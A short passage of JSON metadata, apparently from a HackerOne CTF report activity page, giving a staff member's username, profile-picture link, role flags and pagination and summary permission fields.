resources"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}